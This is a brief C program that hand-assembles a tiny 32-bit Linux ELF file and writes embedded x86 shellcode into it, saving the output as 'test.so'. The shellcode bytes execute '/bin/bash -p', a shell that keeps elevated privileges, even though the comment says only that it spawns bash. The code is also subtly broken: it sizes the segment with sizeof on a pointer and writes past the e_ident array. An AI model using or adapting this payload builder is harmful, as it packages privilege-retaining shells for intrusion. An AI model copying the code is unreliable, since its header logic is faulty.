#include <elf.h>
#include <stdio.h>
#include <string.h>


const char* shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; // Spawns /bin/bash





int main(void){

    Elf32_Ehdr ehdr;
    Elf32_Phdr phdr;




    // ELF header

    ehdr.e_ident[EI_MAG0] = ELFMAG0; // Define 0x07f
    ehdr.e_ident[EI_MAG1] = ELFMAG1; // Define letter E
    ehdr.e_ident[EI_MAG2] = ELFMAG2; // Define letter L
    ehdr.e_ident[EI_MAG3] = ELFMAG3; // Define letter F
    ehdr.e_ident[EI_CLASS] = ELFCLASS32; // Define 32 bit
    ehdr.e_ident[EI_DATA] = ELFDATA2LSB; // Define that is little endian
    ehdr.e_ident[EI_VERSION] = EV_CURRENT; // Define Current ELF VERSION
    ehdr.e_ident[EI_OSABI] = ELFOSABI_SYSV; // Define Unix - SystemV ABI
    ehdr.e_ident[EI_ABIVERSION] = 0; // Define current ABI VERSION
    ehdr.e_ident[EI_PAD] = 7; // Define padding bits
    ehdr.e_ident[EI_NIDENT] = 9;


    ehdr.e_type = ET_EXEC; // Executable file
    ehdr.e_machine = EM_386; // Type of machine
    ehdr.e_version = EV_CURRENT; // Version of ELF
    ehdr.e_entry = 0x8048054; // The entry point
    ehdr.e_phoff = 0x34; // The PHDR offset
    ehdr.e_shoff = 0; // SHDR Offset
    ehdr.e_flags = 0; // Flags
    ehdr.e_ehsize = 0x34; // ELF Header size
    ehdr.e_phentsize = 0x20; // Size of a entry on PHDR Table
    ehdr.e_phnum = 1; // Number of Program Headers
    ehdr.e_shentsize = 0x0; //0x2800; //  Size of SHDR
    ehdr.e_shnum = 0x0000; // Number of Sections
    ehdr.e_shstrndx = 0x0000; // Contains the Section Header Table Index of The Entry


    // Program header

    phdr.p_type = PT_LOAD; // Type of PHDR
    phdr.p_offset = 0x000054; // PHDR Offset
    phdr.p_vaddr = 0x08048054; // Virtual Address
    phdr.p_paddr = 0x0; // Physical Address
    phdr.p_filesz = sizeof(shellcode); // Size of the segment in the file
    phdr.p_memsz = sizeof(shellcode); // Size of the segment in the memory
    phdr.p_flags = PF_X | PF_R; // Flags
    phdr.p_align = 0x1000; // Alignment


    FILE* out = fopen("test.so", "w");
    fwrite(&ehdr, sizeof(Elf32_Ehdr), 1 , out);
    fwrite(&phdr, sizeof(Elf32_Phdr), 1,  out);
    fwrite(shellcode, strlen(shellcode), 1,  out);
    fclose(out);

}
